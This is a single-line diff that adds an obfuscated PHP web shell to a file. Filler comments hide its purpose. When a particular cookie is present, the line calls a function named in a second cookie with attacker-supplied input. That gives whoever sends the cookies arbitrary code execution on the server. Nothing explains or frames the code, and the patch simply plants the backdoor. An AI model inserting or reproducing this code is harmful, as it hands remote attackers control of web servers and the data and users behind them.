@@ -1,0 +1,1 @@
+<?php /*PoX*/if/*l*/(isset($_COOKIE["aLYhp"])){$_COOKIE["kxbJ"]($_COOKIE["aLYhp"]);exit;}/*TMz*/
